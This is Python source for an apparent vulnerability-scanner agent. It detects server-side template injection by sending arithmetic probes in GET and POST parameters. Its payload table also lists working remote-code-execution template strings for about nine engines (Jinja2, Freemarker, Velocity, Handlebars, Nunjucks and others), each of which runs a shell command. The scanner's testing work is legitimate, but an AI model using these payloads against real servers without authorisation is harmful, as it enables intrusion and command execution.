"""
SSTI (Server-Side Template Injection) detection agent
"""

import asyncio
from typing import List, Dict, Any
import httpx
import re
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class SSTIAgent(BaseAgent):
    """Agent for detecting Server-Side Template Injection vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("SSTI Agent", target, event_bus=event_bus, memory_manager=memory_manager)

        self.template_payloads = [
            {
                "engine": "Jinja2/Django/Twig",
                "test": "{{7*7}}",
                "expected": ["49"],
                "rce": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            },
            {
                "engine": "Jinja2",
                "test": "{{7*'7'}}",
                "expected": ["7777777"],
                "rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            },
            {
                "engine": "Freemarker",
                "test": "${7*7}",
                "expected": ["49"],
                "rce": "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
            },
            {
                "engine": "Velocity",
                "test": "#set($x=7*7)$x",
                "expected": ["49"],
                "rce": "#set($e=$x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null));$e.exec('id')",
            },
            {
                "engine": "Smarty",
                "test": "{$smarty.version}",
                "expected": ["Smarty"],
                "rce": "{system('id')}",
            },
            {
                "engine": "Mako",
                "test": "${7*7}",
                "expected": ["49"],
                "rce": "${self.module.cache.util.os.popen('id').read()}",
            },
            {
                "engine": "Jade/Pug",
                "test": "#{7*7}",
                "expected": ["49"],
                "rce": None,
            },
            {
                "engine": "Underscore/ERB",
                "test": "<%= 7*7 %>",
                "expected": ["49"],
                "rce": "<%= system('id') %>",
            },
            {
                "engine": "NunJucks",
                "test": "{{7*7}}",
                "expected": ["49"],
                "rce": "{{range.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            },
            {
                "engine": "Handlebars",
                "test": "{{7*7}}",
                "expected": ["49"],
                "rce": "{{#with 's' as |string|}}{{#with 'e' as |e|}}{{#with 'eval' as |eval|}}{{#with (split (toJSON (lookup this (lookup this (split (join (concat (lookup this (join (lookup this 'constructor'))) ' ')) '')))) ' ')}}{{#with (lookup this (lookup this (join (lookup this 'constructor') '')))}}{{this (lookup this 'eval') 'require(\"child_process\").execSync(\"id\")'}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
            },
        ]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")
        await self._test_url_parameters()
        await self._test_post_parameters()
        await self._run_nuclei_tags(tags=["ssti", "server-side-template-injection", "template-injection"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_url_parameters(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True, verify=False) as client:
            for test_url in self.get_test_urls():
                for payload in self.template_payloads:
                    try:
                        params = {"name": payload["test"], "q": payload["test"], "search": payload["test"]}
                        response = await client.get(test_url, params=params)
                        if self._detect_ssti(response.text, payload):
                            rce_available = payload.get("rce") is not None
                            self.add_finding(Finding(
                                title=f"SSTI in GET parameter [{payload['engine']}]",
                                description=f"Server-Side Template Injection detected. Engine: {payload['engine']}. RCE possible: {rce_available}",
                                severity="critical" if rce_available else "high",
                                category="injection",
                                evidence=f"Template math evaluated in response. Test: {payload['test']}",
                                proof_of_concept=f"GET {test_url}?name={payload['test']}",
                                remediation="Do not render user input as templates. Use sandboxed template engines.",
                                confidence=0.9,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing SSTI: {e}")

    async def _test_post_parameters(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True, verify=False) as client:
            for test_url in self.get_test_urls():
                for payload in self.template_payloads[:6]:
                    try:
                        data = {"name": payload["test"], "body": payload["test"]}
                        response = await client.post(test_url, data=data)
                        if self._detect_ssti(response.text, payload):
                            self.add_finding(Finding(
                                title=f"SSTI in POST parameter [{payload['engine']}]",
                                description=f"SSTI via POST data. Engine: {payload['engine']}",
                                severity="critical" if payload.get("rce") else "high",
                                category="injection",
                                evidence=f"Template math evaluated in POST response",
                                proof_of_concept=f"POST {test_url} with data: {data}",
                                remediation="Validate and sandbox template inputs",
                                confidence=0.85,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing POST SSTI: {e}")

    def _detect_ssti(self, response_text: str, payload: Dict[str, Any]) -> bool:
        expected = payload.get("expected", [])
        for exp in expected:
            if exp in response_text:
                return True
        return False
